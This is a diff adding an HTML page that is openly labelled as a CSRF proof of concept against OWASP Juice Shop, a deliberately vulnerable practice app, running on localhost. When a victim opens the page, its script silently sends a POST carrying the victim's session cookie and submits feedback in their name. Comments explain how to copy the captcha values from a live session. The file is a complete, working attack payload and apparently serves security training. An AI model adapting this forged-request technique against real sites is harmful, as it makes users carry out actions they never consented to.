@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF PoC - OWASP Juice Shop</title>
+</head>
+<body>
+  <h2>CSRF Proof of Concept - Juice Shop Feedback</h2>
+  <p>When victim visits this page, a feedback is submitted on their behalf.</p>
+
+  <script>
+    // CSRF Attack: Submitting feedback without user's knowledge
+    // Target: OWASP Juice Shop - POST /api/Feedbacks
+    // NOTE: Update captchaId and captcha values from a live session
+
+    fetch("http://localhost:3000/api/Feedbacks", {
+      method: "POST",
+      credentials: "include",   // sends victim's session cookie
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        comment: "CSRF Attack - Submitted without user consent",
+        rating: 1,
+        captchaId: 0,            // replace with actual captchaId from network tab
+        captcha: "12"            // replace with actual captcha answer from network tab
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log("CSRF Success:", data);
+      document.body.innerHTML += "<p style='color:green'>CSRF request sent! Check Juice Shop feedback.</p>";
+    })
+    .catch(err => {
+      console.error("CSRF Failed:", err);
+      document.body.innerHTML += "<p style='color:red'>Request failed - check CORS or captcha value.</p>";
+    });
+  </script>
+</body>
+</html>
